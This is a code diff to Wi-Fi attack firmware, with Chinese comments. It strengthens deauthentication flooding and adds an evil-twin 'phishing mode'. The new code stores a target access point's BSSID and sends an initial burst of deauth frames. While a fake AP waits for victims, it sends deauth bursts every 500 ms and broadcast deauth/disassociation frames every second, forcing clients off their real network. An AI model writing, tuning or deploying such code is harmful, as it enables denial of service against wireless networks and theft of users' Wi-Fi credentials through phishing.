@@ -332,6 +332,11 @@ static bool webtest_border_always_on = false;
 static int webtest_flash_remaining_toggles = 0; // 4 toggles = 闪烁两下
 static unsigned long webtest_last_flash_toggle_ms = 0;
 static bool webtest_border_flash_visible = true;
+	// 钓鱼模式：目标BSSID与定期Deauth控制
+	static bool phishingHasTarget = false;
+	static uint8_t phishingTargetBSSID[6] = {0};
+	static unsigned long lastPhishingDeauthMs = 0;
+	static unsigned long lastPhishingBroadcastMs = 0;
 
 // 攻击检测边框效果变量
 static bool detect_border_always_on = false;
@@ -4395,8 +4400,10 @@ void BeaconDeauth() {
             }
           }
           
-          // 优化：批量发送deauth帧
-          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 0, 10, packetCount, 0);
+          // 使用原因码 1/4/16 组合，小批量，帧间隔 5ms
+          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 1, 1, packetCount, 5);
+          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 4, 1, packetCount, 5);
+          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 16, 1, packetCount, 5);
           if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
             digitalWrite(LED_R, HIGH);
             delay(50);
@@ -4431,7 +4438,10 @@ void BeaconDeauth() {
           }
         }
         
-        sendFixedReasonDeauthBurst(scan_results[i].bssid, 0, 10, packetCount, 0);
+        // 对齐示例：使用原因码 1/4/16 组合，小批量，帧间隔 5ms
+        sendFixedReasonDeauthBurst(scan_results[i].bssid, 1, 1, packetCount, 5);
+        sendFixedReasonDeauthBurst(scan_results[i].bssid, 4, 1, packetCount, 5);
+        sendFixedReasonDeauthBurst(scan_results[i].bssid, 16, 1, packetCount, 5);
         if (packetCount >= 100) {
           digitalWrite(LED_R, HIGH);
           delay(50);
@@ -6120,6 +6130,8 @@ bool startWebTest() {
     int chosenIndex = SelectedVector[0];
     if (chosenIndex >= 0 && (size_t)chosenIndex < scan_results.size()) {
       chosenSsid = scan_results[chosenIndex].ssid;
+      memcpy(phishingTargetBSSID, scan_results[chosenIndex].bssid, 6);
+      phishingHasTarget = true;
       if (chosenSsid.length() == 0) {
         char mac[18];
         snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -6173,6 +6185,17 @@ bool startWebTest() {
     startWebUILED();
 
     Serial.println("钓鱼模式启动完成，等待客户端连接...");
+    // 初始化钓鱼去认证诱发计时，并发送一次预突发
+    unsigned long nowInit = millis();
+    lastPhishingDeauthMs = nowInit;
+    lastPhishingBroadcastMs = nowInit;
+    if (phishingHasTarget) {
+      int dummy = 0;
+      // 预突发：各原因码发送数帧，帧间隔 5ms
+      for (int i = 0; i < 5; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 1, 1, dummy, 5); }
+      for (int i = 0; i < 5; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 4, 1, dummy, 5); }
+      for (int i = 0; i < 5; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 16, 1, dummy, 5); }
+    }
     return true;
   } else {
     Serial.println("AP模式启动失败!");
@@ -7134,6 +7157,27 @@ void handleWebTest() {
       webtest_ui_page = 0;
     }
     lastOkTime = currentTime;
+  }
+
+  // 钓鱼期间：周期性发送去认证诱发（加强版）
+  // 频率提升：每 ~500ms 对目标发送小突发（原因码 1/4/16，各 3 帧，5ms间隔）
+  // 并且每 ~1s 发送一次广播去认证/解除关联，唤醒潜在STA
+  if (phishingHasTarget) {
+    unsigned long now = millis();
+    if (now - lastPhishingDeauthMs >= 500UL) {
+      int dummyCount = 0;
+      for (int i = 0; i < 3; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 1, 1, dummyCount, 5); }
+      for (int i = 0; i < 3; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 4, 1, dummyCount, 5); }
+      for (int i = 0; i < 3; i++) { sendFixedReasonDeauthBurst(phishingTargetBSSID, 16, 1, dummyCount, 5); }
+      lastPhishingDeauthMs = now;
+    }
+    if (now - lastPhishingBroadcastMs >= 1000UL) {
+      // 广播去认证与解除关联（轻量），与handshake.h逻辑保持一致
+      wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 7, 2, 500);
+      wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 1, 2, 500);
+      wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 1, 500);
+      lastPhishingBroadcastMs = now;
+    }
   }
 
   if (currentTime - last_web_check >= WEB_CHECK_INTERVAL) {
